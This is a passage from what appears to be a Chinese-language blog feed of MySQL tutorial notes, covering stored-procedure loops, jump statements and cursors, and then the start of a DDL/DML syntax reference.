class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">		<span class="keyword">WHEN</span> <span class="number">2</span> <span class="keyword">THEN</span> <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> salary <span class="operator">=</span> salary <span class="operator">+</span> <span class="number">200</span> <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">		<span class="keyword">WHEN</span> <span class="number">3</span> <span class="keyword">THEN</span> <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> salary <span class="operator">=</span> salary <span class="operator">+</span> <span class="number">300</span> <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">		<span class="keyword">WHEN</span> <span class="number">4</span> <span class="keyword">THEN</span> <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> salary <span class="operator">=</span> salary <span class="operator">+</span> <span class="number">400</span> <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">		<span class="keyword">ELSE</span> <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> salary <span class="operator">=</span> salary <span class="operator">+</span> <span class="number">500</span> <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">	<span class="keyword">END</span> <span class="keyword">CASE</span>;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"># 调用</span><br><span class="line"><span class="keyword">CALL</span> update_salary_by_eid5(<span class="number">101</span>);</span><br></pre></td></tr></table></figure>


<h2 id="3-循环结构之LOOP"><a href="#3-循环结构之LOOP" class="headerlink" title="3.  循环结构之LOOP"></a>3.  循环结构之LOOP</h2><p><code>LOOP</code>循环语句用来<strong>重复执行某些语句</strong>。<code>LOOP</code>内的语句一直重复执行直到循环被退出（使用<code>LEAVE</code>子句），跳出循环过程。</p>
<ul>
<li>LOOP语句的基本格式如下</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[loop_label:] LOOP</span><br><span class="line">	循环执行的语句</span><br><span class="line"><span class="keyword">END</span> LOOP [loop_label]</span><br></pre></td></tr></table></figure>
<p>其中，<code>loop_label</code>表示LOOP语句的标注名称，该参数可以省略。</p>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> test_loop()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	# 声明局部变量</span><br><span class="line">	<span class="keyword">DECLARE</span> num <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">1</span>;</span><br><span class="line">	</span><br><span class="line">	loop_label:LOOP</span><br><span class="line">		# 重新赋值</span><br><span class="line">		<span class="keyword">SET</span> num <span class="operator">=</span> num <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">		# LEVEL 是后面将会谈到的跳转语句，在此处即表示跳出循环</span><br><span class="line">		IF num <span class="operator">&gt;=</span> <span class="number">10</span> <span class="keyword">THEN</span> LEAVE loop_label;</span><br><span class="line">		<span class="keyword">END</span> IF;</span><br><span class="line">	<span class="keyword">END</span> LOOP loop_label;</span><br><span class="line">	</span><br><span class="line">	# 查看num</span><br><span class="line">	<span class="keyword">SELECT</span> num;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"># 调用</span><br><span class="line"><span class="keyword">CALL</span> test_loop();</span><br></pre></td></tr></table></figure>

<h2 id="4-循环结构之WHILE"><a href="#4-循环结构之WHILE" class="headerlink" title="4. 循环结构之WHILE"></a>4. 循环结构之WHILE</h2><p><code>WHILE</code>语句创建一个带条件判断的循环过程。<code>WHILE</code>在执行语句执行时，先对指定的表达式进行判断，如果为真，就执行循环内的语句，否则退出循环。</p>
<ul>
<li>WHILE语句的基本格式如下</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[while_label:] WHILE 循环条件 DO</span><br><span class="line">	循环体</span><br><span class="line"><span class="keyword">END</span> WHILE [while_label];</span><br></pre></td></tr></table></figure>

<p><code>while_label</code>为WHILE语句的标注名称；如果循环条件结果为真，WHILE语句内的语句或语句群被执行，直至循环条件为假，退出循环。</p>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> test_while()</span><br><span class="line"><span class="keyword">BEGIN</span>	</span><br><span class="line">	# 初始化条件</span><br><span class="line">	<span class="keyword">DECLARE</span> num <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">1</span>;</span><br><span class="line">	# 循环条件</span><br><span class="line">	WHILE num <span class="operator">&lt;=</span> <span class="number">10</span> DO</span><br><span class="line">		# 循环体（略）</span><br><span class="line">		# 迭代条件</span><br><span class="line">		<span class="keyword">SET</span> num <span class="operator">=</span> num <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">END</span> WHILE;</span><br><span class="line">	# 查询</span><br><span class="line">	<span class="keyword">SELECT</span> num;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"># 调用</span><br><span class="line"><span class="keyword">CALL</span> test_while();</span><br></pre></td></tr></table></figure>

<h2 id="5-循环结构之REPEAT"><a href="#5-循环结构之REPEAT" class="headerlink" title="5. 循环结构之REPEAT"></a>5. 循环结构之REPEAT</h2><p><code>REPEAT</code>语句创建一个带条件判断的循环过程。与WHILE循环不同的是，REPEAT 循环首先会执行一次循环，然后在 <code>UNTIL</code> 中进行表达式的判断，如果满足条件就退出，即 <code>END REPEAT</code>；如果条件不满足，则会就继续执行循环，直到满足退出条件为止。</p>
<ul>
<li>REPEAT语句的基本格式如下</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[repeat_label:] REPEAT</span><br><span class="line">	循环体的语句</span><br><span class="line">	UNTIL 结束循环的条件表达式</span><br><span class="line"><span class="keyword">END</span> REPEAT [repeat_label]</span><br></pre></td></tr></table></figure>
<p><code>repeat_label</code>为REPEAT语句的标注名称，该参数可以省略；REPEAT语句内的语句或语句群被重复，直至expr_condition为真。</p>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> test_repeat()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	# 声明变量</span><br><span class="line">	<span class="keyword">DECLARE</span> num <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">1</span>;</span><br><span class="line">	REPEAT</span><br><span class="line">		<span class="keyword">SET</span> num <span class="operator">=</span> num <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">		UNTIL num <span class="operator">&gt;=</span> <span class="number">10</span></span><br><span class="line">	<span class="keyword">END</span> REPEAT;</span><br><span class="line">	# 查看</span><br><span class="line">	<span class="keyword">SELECT</span> num;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"># 调用</span><br><span class="line"><span class="keyword">CALL</span> test_repeat();</span><br></pre></td></tr></table></figure>

<h2 id="6-跳转语句之LEAVE语句"><a href="#6-跳转语句之LEAVE语句" class="headerlink" title="6. 跳转语句之LEAVE语句"></a>6. 跳转语句之LEAVE语句</h2><p><code>LEAVE</code>语句：可以用在循环语句内，或者以 BEGIN 和 END 包裹起来的程序体内，表示跳出循环或者跳出程序体的操作。如果你有面向过程的编程语言的使用经验，你可以把 LEAVE 理解为 <code>break</code>。</p>
<ul>
<li>基本格式如下</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LEAVE label</span><br></pre></td></tr></table></figure>

<p>label参数表示循环的标志。LEAVE和BEGIN … END或循环一起被使用。</p>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> test_loop()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	# 声明局部变量</span><br><span class="line">	<span class="keyword">DECLARE</span> num <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">1</span>;</span><br><span class="line">	</span><br><span class="line">	loop_label:LOOP</span><br><span class="line">		# 重新赋值</span><br><span class="line">		<span class="keyword">SET</span> num <span class="operator">=</span> num <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">		# LEVEL 是后面将会谈到的跳转语句，在此处即表示跳出循环</span><br><span class="line">		IF num <span class="operator">&gt;=</span> <span class="number">10</span> <span class="keyword">THEN</span> LEAVE loop_label;</span><br><span class="line">		<span class="keyword">END</span> IF;</span><br><span class="line">	<span class="keyword">END</span> LOOP loop_label;</span><br><span class="line">	</span><br><span class="line">	# 查看num</span><br><span class="line">	<span class="keyword">SELECT</span> num;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"># 调用</span><br><span class="line"><span class="keyword">CALL</span> test_loop();</span><br></pre></td></tr></table></figure>

<h2 id="7-跳转语句之ITERATE语句"><a href="#7-跳转语句之ITERATE语句" class="headerlink" title="7. 跳转语句之ITERATE语句"></a>7. 跳转语句之ITERATE语句</h2><p><code>ITERATE</code>语句：只能用在循环语句（LOOP、REPEAT和WHILE语句）内，表示重新开始循环，将执行顺序转到语句段开头处。如果你有面向过程的编程语言的使用经验，你可以把 ITERATE 理解为 <code>continue</code>。</p>
<ul>
<li>语句基本格式</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ITERATE label</span><br></pre></td></tr></table></figure>


<p>label参数表示循环的标志。ITERATE语句必须跟在循环标志前面。</p>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">举例： 定义局部变量num，初始值为0。循环结构中执行num + 1操作。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- 如果num &lt; 10，则继续执行循环；</span></span><br><span class="line"><span class="comment">- 如果num &gt; 15，则退出循环结构；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> test_iterate()</span><br><span class="line"></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	<span class="keyword">DECLARE</span> num <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	loop_label:LOOP</span><br><span class="line">		# 赋值</span><br><span class="line">		<span class="keyword">SET</span> num <span class="operator">=</span> num <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">		IF num  <span class="operator">&lt;</span> <span class="number">10</span></span><br><span class="line">			<span class="keyword">THEN</span> ITERATE loop_label;</span><br><span class="line">		ELSEIF num <span class="operator">&gt;</span> <span class="number">15</span></span><br><span class="line">			<span class="keyword">THEN</span> LEAVE loop_label;</span><br><span class="line">		<span class="keyword">END</span> IF;</span><br><span class="line">		<span class="keyword">SELECT</span> <span class="string">&#x27;Hello ITERATE&#x27;</span>;</span><br><span class="line">	<span class="keyword">END</span> LOOP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> test_iterate();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="8-LOOP、WHILE、REPEAT的异同"><a href="#8-LOOP、WHILE、REPEAT的异同" class="headerlink" title="8. LOOP、WHILE、REPEAT的异同"></a>8. LOOP、WHILE、REPEAT的异同</h2><ul>
<li><p><code>LOOP</code> 循环，先执行，后判断。满足条件，不执行，结束循环。</p>
</li>
<li><p><code>WHILE</code> 循环，先判断，后执行。满足条件，执行，执行循环。</p>
</li>
<li><p><code>REPEAT</code> 循环，先执行，后判断。满足条件，不执行，结束循环。</p>
</li>
<li><p>当条件为false时，REPEAT循环也能执行一次，类似于 java中的 do {} while (condition); 循环； 而 WHILE、LOOP 循环无法执行。</p>
</li>
</ul>
<hr>
<h1 id="四、游标"><a href="#四、游标" class="headerlink" title="四、游标"></a>四、游标</h1><h2 id="1-游标（或光标）的理解"><a href="#1-游标（或光标）的理解" class="headerlink" title="1. 游标（或光标）的理解"></a>1. 游标（或光标）的理解</h2><p>虽然我们也可以通过筛选条件 <code>WHERE</code> 和 <code>HAVING</code>，或者是限定返回记录的关键字 <code>LIMIT</code> 返回一条记录，但是，却无法在结果集中像指针一样，向前定位一条记录、向后定位一条记录，或者是 <strong>随意定位到某一条记录</strong> ，并对记录的数据进行处理。</p>
<p>这个时候，就可以用到游标。游标，提供了一种灵活的操作方式，让我们能够对结果集中的每一条记录进行定位，并对指向的记录中的数据进行操作的数据结构。游标让 SQL 这种面向集合的语言有了面向过程开发的能力。</p>
<p>在 SQL 中，游标是一种临时的数据库对象，可以指向存储在数据库表中的数据行指针。这里游标 <strong>充当了指针的作用</strong> ，我们可以通过操作游标来对数据行进行操作。</p>
<p>MySQL中游标可以在<strong>存储过程</strong>和<strong>函数</strong>中使用</p>
<p>比如，我们查询了 employees 数据表中工资高于15000的员工都有哪些：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employee_id,last_name,salary <span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">WHERE</span> salary <span class="operator">&gt;</span> <span class="number">15000</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815134834.png" alt=" "></p>
<p>这里我们就可以通过游标来操作数据行，如图所示此时游标所在的行是“108”的记录，我们也可以在结果集上滚动游标，指向结果集中的任意一行。</p>
<h2 id="2-使用游标步骤"><a href="#2-使用游标步骤" class="headerlink" title="2. 使用游标步骤"></a>2. 使用游标步骤</h2><p>游标必须在声明处理程序之前被声明，并且变量和条件还必须在声明游标或处理程序之前被声明。</p>
<p>如果我们想要使用游标，一般需要经历四个步骤。不同的 DBMS 中，使用游标的语法可能略有不同。</p>
<blockquote>
<p><strong>游标使用的步骤</strong>：<br>① 声明游标<br>② 打开游标<br>③ 使用游标（从游标中获取数据）<br>④ 关闭游标</p>
</blockquote>
<ul>
<li><strong>第一步，声明游标</strong></li>
</ul>
<p>在MySQL中，使用DECLARE关键字来声明游标，其语法的基本形式如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> cursor_name <span class="keyword">CURSOR</span> <span class="keyword">FOR</span> select_statement;</span><br></pre></td></tr></table></figure>
<p>这个语法适用于 MySQL，SQL Server，DB2 和 MariaDB。如果是用 Oracle 或者 PostgreSQL，需要写成：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> cursor_name <span class="keyword">CURSOR</span> <span class="keyword">IS</span> select_statement;</span><br></pre></td></tr></table></figure>


<p>要使用 SELECT 语句来获取数据结果集，而此时还没有开始遍历数据，这里 <code>select_statement</code>代表的就是SELECT 语句，返回一个用于创建游标的结果集。</p>
<p>比如</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> cur_emp <span class="keyword">CURSOR</span> <span class="keyword">FOR</span></span><br><span class="line"><span class="keyword">SELECT</span> employee_id,salary <span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>第二步，打开游标</strong></li>
</ul>
<p>打开游标的语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">OPEN</span> cursor_name</span><br></pre></td></tr></table></figure>

<p>当我们定义好游标之后，如果想要使用游标，必须先打开游标。打开游标的时候 SELECT 语句的查询结果集就会送到游标工作区，为后面游标的 <strong>逐条读取</strong> 结果集中的记录做准备。</p>
<ul>
<li><strong>第三步，使用游标（从游标中取得数据）</strong></li>
</ul>
<p>语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FETCH</span> cursor_name <span class="keyword">INTO</span> var_name [, var_name] ...</span><br></pre></td></tr></table></figure>

<p>这句的作用是使用 cursor_name 这个游标来读取当前行，并且将数据保存到 <code>var_name</code> 这个变量中，游标指针指到下一行。如果游标读取的数据行有多个列名，则在 <code>INTO</code> 关键字后面赋值给多个变量名即可。</p>
<p><strong>注意</strong>：var_name必须在声明游标之前就定义好</p>
<p>示例</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FETCH</span> cur_emp <span class="keyword">INTO</span> emp_id, emp_sal ;</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：游标的查询结果集中的字段数，必须跟 <code>INTO</code> 后面的变量数一致，否则，在存储过程执行的时候，MySQL 会提示错误。</p>
<ul>
<li><strong>第四步，关闭游标</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CLOSE</span> cursor_name</span><br></pre></td></tr></table></figure>
<p>有 <code>OPEN</code> 就会有 <code>CLOSE</code>，也就是打开和关闭游标。当我们使用完游标后需要关闭掉该游标。因为游标会 <strong>占用系统资源</strong> ，如果不及时关闭，<strong>游标会一直保持到存储过程结束</strong>，<strong>影响系统运行的效率</strong>。而关闭游标的操作，会释放游标占用的系统资源。</p>
<p>关闭游标之后，我们就不能再检索查询结果中的数据行，如果需要检索只能再次打开游标。</p>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">举例：创建存储过程“get_count_by_limit_total_salary()”，</span></span><br><span class="line"><span class="comment">	声明IN参数 limit_total_salary，DOUBLE类型；</span></span><br><span class="line"><span class="comment">	声明OUT参数total_count，INT类型。</span></span><br><span class="line"><span class="comment">函数的功能可以实现累加薪资最高的几个员工的薪资值，</span></span><br><span class="line"><span class="comment">直到薪资总和达到limit_total_salary参数的值，返回累加的人数给total_count。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> get_count_by_limit_total_salary(<span class="keyword">IN</span> limit_total_salary <span class="keyword">DOUBLE</span>, <span class="keyword">OUT</span> total_count <span class="type">INT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	# 声明局部变量</span><br><span class="line">	<span class="keyword">DECLARE</span> sum_sal <span class="keyword">DOUBLE</span> <span class="keyword">DEFAULT</span> <span class="number">0.0</span>; # 记录累加的工资总额</span><br><span class="line">	<span class="keyword">DECLARE</span> emp_sal <span class="keyword">DOUBLE</span>;  # 记录每一个员工的工资</span><br><span class="line">	<span class="keyword">DECLARE</span> emp_count <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;# 记录累加的人数</span><br><span class="line">	</span><br><span class="line">	# <span class="number">1.</span>声明游标</span><br><span class="line">	<span class="keyword">DECLARE</span> emp_cursor <span class="keyword">CURSOR</span> <span class="keyword">FOR</span> <span class="keyword">SELECT</span> salary <span class="keyword">FROM</span> employees <span class="keyword">ORDER</span> <span class="keyword">BY</span> salary <span class="keyword">DESC</span>;</span><br><span class="line">	</span><br><span class="line">	# <span class="number">2.</span>打开游标</span><br><span class="line">	<span class="keyword">OPEN</span> emp_cursor;</span><br><span class="line">	</span><br><span class="line">	REPEAT</span><br><span class="line">		# <span class="number">3.</span>使用游标</span><br><span class="line">		<span class="keyword">FETCH</span> emp_cursor <span class="keyword">INTO</span> emp_sal;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">SET</span> sum_sal <span class="operator">=</span> sum_sal <span class="operator">+</span> emp_sal;</span><br><span class="line">		<span class="keyword">SET</span> emp_count <span class="operator">=</span> emp_count <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">		UNTIL sum_sal <span class="operator">&gt;=</span> limit_total_salary</span><br><span class="line">	<span class="keyword">END</span> REPEAT;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">SET</span> total_count <span class="operator">=</span> emp_count;</span><br><span class="line">	# <span class="number">4.</span>关闭游标</span><br><span class="line">	<span class="keyword">CLOSE</span> emp_cursor;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"># 调用</span><br><span class="line"><span class="keyword">CALL</span> get_count_by_limit_total_salary(<span class="number">200000</span>,<span class="variable">@total_count</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@total_count</span>;</span><br></pre></td></tr></table></figure>

<p>游标是 MySQL 的一个重要的功能，为 <strong>逐条读取</strong> 结果集中的数据，提供了完美的解决方案。跟在应用层面实现相同的功能相比，游标可以在存储程序中使用，效率高，程序也更加简洁。</p>
<p>但同时也会带来一些性能问题，比如在使用游标的过程中，会对数据行进行 <strong>加锁</strong> ，这样在业务并发量大的时候，不仅会影响业务之间的效率，还会 <strong>消耗系统资源</strong> ，造成内存不足，这是因为游标是在内存中进行的处理。</p>
<p>建议：养成用完之后就关闭的习惯，这样才能提高系统的整体效率。</p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>sql</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL常用语句（DDL、DML、DQL）</title>
    <url>/posts/4369ac96.html</url>
    <content><![CDATA[<h1 id="一、DDL（Data-Definition-Language）"><a href="#一、DDL（Data-Definition-Language）" class="headerlink" title="一、DDL（Data Definition Language）"></a>一、DDL（Data Definition Language）</h1><p>用来定义数据库对象：数据库、表、列等。</p>
<h2 id="1、DDL操作数据库"><a href="#1、DDL操作数据库" class="headerlink" title="1、DDL操作数据库"></a>1、DDL操作数据库</h2><h3 id="①查询"><a href="#①查询" class="headerlink" title="①查询"></a>①查询</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES;</span><br></pre></td></tr></table></figure>
<h3 id="②创建"><a href="#②创建" class="headerlink" title="②创建"></a>②创建</h3><p><strong>—-a) 创建数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE 数据库名称;</span><br></pre></td></tr></table></figure>
<p><strong>—-b) 创建数据库(判断，若不存在则创建)</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> 数据库名称;</span><br></pre></td></tr></table></figure>
<h3 id="③删除"><a href="#③删除" class="headerlink" title="③删除"></a>③删除</h3><p><strong>—-a) 删除数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE 数据库名称;</span><br></pre></td></tr></table></figure>
<p><strong>—-b) 删除数据库(判断，若存在则删除)</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> 数据库名称;</span><br></pre></td></tr></table></figure>
<h3 id="④使用数据库"><a href="#④使用数据库" class="headerlink" title="④使用数据库"></a>④使用数据库</h3><p><strong>—-a) 查看当前使用的数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE();</span><br></pre></td></tr></table></figure>
<p><strong>—-b) 使用数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">USE 数据库名称;</span><br></pre></td></tr></table></figure>
<h2 id="2、DDL操作数据表"><a href="#2、DDL操作数据表" class="headerlink" title="2、DDL操作数据表"></a>2、DDL操作数据表</h2><h3 id="①查询-1"><a href="#①查询-1" class="headerlink" title="①查询"></a>①查询</h3><p><strong>—-a) 查看当前数据库下所有表名称</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br></pre></td></tr></table></figure>
<p><strong>—-b) 查询表结构</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DESC</span> 表名称;</span><br></pre></td></tr></table></figure>
<h3 id="②创建-1"><a href="#②创建-1" class="headerlink" title="②创建"></a>②创建</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">	字段名<span class="number">1</span>  数据类型<span class="number">1</span> [约束<span class="number">11</span> 约束<span class="number">12</span> ...],</span><br><span class="line">	字段名<span class="number">2</span>  数据类型<span class="number">2</span> [约束<span class="number">21</span> 约束<span class="number">22</span> ...],</span><br><span class="line">	...</span><br><span class="line">	字段名n  数据类型n [约束n1 约束n2 ...]</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p><strong>SQL数据类型如图</strong><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163520.png" alt="SQL数据类型"> <strong>SQL各约束如图</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163520.png" alt="SQL各约束"></p>
<h3 id="③修改"><a href="#③修改" class="headerlink" title="③修改"></a>③修改</h3><p><strong>—-a) 修改表名</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 RENAME <span class="keyword">TO</span> 新表名;</span><br></pre></td></tr></table></figure>
<p><strong>—-b) 添加一列</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> 列名 数据类型;</span><br></pre></td></tr></table></figure>
<p><strong>—-c) 修改数据类型</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 MODIFY 列名 新数据类型;</span><br></pre></td></tr></table></figure>
<p><strong>—-d) 修改列名和数据类型</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 CHANGE 列名 新列名 新数据类型;</span><br></pre></td></tr></table></figure>
<p><strong>—-e) 删除列</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> 列名;</span><br></pre></td></tr></table></figure>
<h3 id="④删除"><a href="#④删除" class="headerlink" title="④删除"></a>④删除</h3><p><strong>—-a) 删除表</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> 表名;</span><br></pre></td></tr></table></figure>
<p><strong>—-b) 删除表(判断，若存在则删除)</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> 表名;</span><br></pre></td></tr></table></figure>
<h3 id="⑤外键约束"><a href="#⑤外键约束" class="headerlink" title="⑤外键约束"></a>⑤外键约束</h3><p>外键用于让两个表的数据间建立链接，保证数据的一致性与完整性。<br><strong>—-a) 创建表时添加外键约束</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">	列名 数据类型</span><br><span class="line">	...</span><br><span class="line">	[<span class="keyword">CONSTRAINT</span> 外键名称] <span class="keyword">FOREIGN</span> KEY(外键列名) <span class="keyword">REFERENCES</span> 主表(主表列名)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p><strong>—-b) 建完表后添加外键约束</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> 外键名称 <span class="keyword">FOREIGN</span> KEY(外键列名) <span class="keyword">REFERENCES</span> 主表(主表列名);</span><br></pre></td></tr></table></figure>
<p><strong>—-c) 删除约束</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> KEY 外键名称;</span><br></pre></td></tr></table></figure>
<h1 id="二、DML（Data-Manipulation-Language）"><a href="#二、DML（Data-Manipulation-Language）" class="headerlink" title="二、DML（Data Manipulation Language）"></a>二、DML（Data Manipulation Language）</h1><p>对表中数据进行增删改。</p>
<h2 id="①添加数据"><a href="#①添加数据" class="headerlink" title="①添加数据"></a>①添加数据</h2><p><strong>—-a) 指定列添加数据</strong></p>
